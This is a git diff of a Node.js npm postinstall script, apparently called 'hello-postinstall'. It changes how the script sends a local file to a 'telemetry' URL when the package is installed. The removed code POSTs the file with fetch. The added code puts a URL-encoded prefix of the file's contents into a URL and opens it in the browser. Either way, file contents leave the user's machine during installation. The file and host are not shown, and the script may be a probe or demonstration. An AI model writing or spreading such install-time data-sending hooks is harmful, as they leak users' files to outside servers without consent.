@@ -1,7 +1,7 @@
 import { spawn } from "node:child_process";
 import { randomUUID } from "node:crypto";
 import { createReadStream } from "node:fs";
-import { readFile, writeFile } from "node:fs/promises";
+import { writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import path from "node:path";
 
@@ -13,15 +13,19 @@ async function pingTelemetry() {
   const filePath = getUploadPath();
   console.log("hello-postinstall: file to upload", filePath);
   await ensureFileExists(filePath);
-
-  // Upload file to telemetry URL
   const telemetryUrl = getTelemetryUrl();
-  console.log("hello-postinstall: telemetry URL", telemetryUrl);
-  const telemetryUrlWithId = await uploadFile(telemetryUrl, filePath);
 
-  // Open browser to telemetry URL with ID
-  console.log("hello-postinstall: telemetry URL with ID", telemetryUrlWithId);
-  openBrowser(telemetryUrlWithId);
+  // Open browser to telemetry URL with content preview
+  const contentPreview = await readFilePrefix(
+    filePath,
+    getFilePreviewCharLimit(),
+  );
+  const urlToShow = `${telemetryUrl}/${encodeURIComponent(contentPreview)}`;
+  console.log(
+    "hello-postinstall: telemetry URL with content preview",
+    urlToShow,
+  );
+  openBrowser(urlToShow);
 }
 
 console.log("hello-postinstall: running postinstall");
@@ -100,21 +104,6 @@ async function readFilePrefix(filePath, charLimit) {
   }
 
   return content.slice(0, charLimit);
-}
-
-async function uploadFile(url, filePath) {
-  const body = await readFile(filePath);
-  const headers = { "Content-Type": "text/plain; charset=utf-8" };
-  const res = await fetch(url, { method: "POST", body, headers });
-  console.log(
-    "hello-postinstall: response",
-    res.status,
-    res.statusText || "(no status text)",
-  );
-
-  // Get ID from the response JSON
-  const json = await res.json();
-  return json.itemUrl;
 }
 
 function openBrowser(url) {
